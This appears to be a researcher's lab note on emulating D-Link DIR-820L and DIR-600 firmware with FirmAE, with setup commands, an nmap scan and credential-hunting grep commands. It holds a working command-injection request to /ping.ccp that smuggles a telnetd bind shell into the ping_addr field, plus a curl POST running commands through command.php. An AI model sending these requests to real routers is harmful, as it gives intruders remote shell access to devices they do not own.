## FirmAE
- Clone FirmAE
  - `git clone --recursive https://github.com/pr0v3rbs/FirmAE`
- Run download.sh script.
  - `./download.sh`
- Run install.sh script.
  `./install.sh`
- Execute init.sh script.
  - `./init.sh`
  
- D-Link DIR-820L
  - `http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663`
- binwalk
  - `cd binwalk-2.3.4/python3 setup.py install`
  - `binwalk -Me --run-as=root ./DIR820LA1_FW105B03.bin`
- root
  - `sudo su`
  - `sudo ./run.sh -r DIR820L /home/iotsec/DIR820LA1_FW105B03.bin`
- browser
  - `http://192.168.0.1/login.asp`

- portfowrd
  - `ssh -L 8080:192.168.0.1:80 firm@192.168.31.163`

```
┌──(kali㉿kali)-[~]
└─$ nmap -p 8080 -sV localhost                    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-30 01:38 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000045s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
8080/tcp open  http    jjhttpd 0.1.0 (D-Link or TRENDNet WAP)
Service Info: Device: WAP

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
                                                                              
┌──(kali㉿kali)-[~]
└─$
```

- access

<img width="1254" height="514" alt="image" src="https://github.com/user-attachments/assets/cad30559-6dfe-4054-a2fe-bb228c96d0d5" />

- exploit
```
POST /ping.ccp HTTP/1.1
Host: localhost:8080
Content-Length: 97
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Chromium";v="133", "Not(A:Brand";v="99"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/tools_vct.asp
Accept-Encoding: gzip, deflate, br
Cookie: hasLogin=1
Connection: keep-alive

ccp_act=ping_v4&ping_addr=%0atelnetd+-l+/bin/sh+-p+8000+-b 0.0.0.0%0a&1780120893090=1780120893090
```
https://kb.netgear.com/000062303/WAC104-Firmware-Version-1-0-4-13
https://mdr.skyeye.qianxin.com/forum/share/1806
https://www.itinsight.hu/blog/posts/2015-01-23-mini_httpd-v1-21-information-disclosure.html

cat ./etc/defnodes/defaultvalue.xml
grep -Ri "admin" ./etc/defnodes/
grep -Ri "password" ./etc/defnodes/
cat ./etc/services/DEVICE.ACCOUNT.php
cat ./htdocs/phplib/fatlady/DEVICE.ACCOUNT.php
cat ./htdocs/phplib/setcfg/DEVICE.ACCOUNT.php


https://support.dlink.com.au/Download/download.aspx?product=DIR-600&type=Firmware
./run.sh -r DIR300 ../firmwere/DIR600B5_FW212WWb02.bin
curl -X POST 192.168.0.1/command.php -d 'cmd=ls'
```
